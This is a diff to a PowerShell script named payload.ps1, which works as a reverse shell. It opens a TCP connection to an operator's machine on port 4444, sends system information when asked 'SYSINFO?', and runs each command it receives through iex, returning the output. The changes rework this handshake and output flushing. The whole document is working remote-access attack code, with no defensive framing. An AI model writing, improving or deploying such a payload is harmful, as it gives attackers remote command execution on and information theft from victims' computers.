@@ -1,5 +1,5 @@
-# payload.ps1 - SINGLE CONNECTION (NO RECONNECT LOOP)
-$serverIP = "192.168.1.4"  # ← YOUR ARCH IP
+# payload.ps1 - CORRECTED HANDSHAKE PROTOCOL
+$serverIP = "192.168.1.4"  # ← REPLACE WITH YOUR ARCH IP
 $serverPort = 4444
 
 function Get-SystemInfo {
@@ -15,21 +15,27 @@ try {
     
     $stream = $client.GetStream()
     $writer = New-Object System.IO.StreamWriter($stream)
+    $writer.AutoFlush = $true
     $reader = New-Object System.IO.StreamReader($stream)
     
-    # Send system info
-    $writer.WriteLine((Get-SystemInfo))
-    $writer.Flush()
-    
-    # MAIN LOOP (only exits when server disconnects)
+    # Main loop
     while ($true) {
         $command = $reader.ReadLine()
-        if (-not $command) { break }
-        if ($command -eq "exit") { break }
+        if (-not $command) { break }  # Connection closed
         
+        # SPECIAL HANDLING FOR SYSINFO REQUEST
+        if ($command -eq "SYSINFO?") {
+            $writer.WriteLine((Get-SystemInfo))
+            continue
+        }
+        
+        if ($command -eq "exit") {
+            break
+        }
+        
+        # Execute command and send result
         $result = iex $command 2>&1 | Out-String
-        $writer.WriteLine($result)
-        $writer.Flush()
+        $writer.Write($result)
     }
 }
 finally {
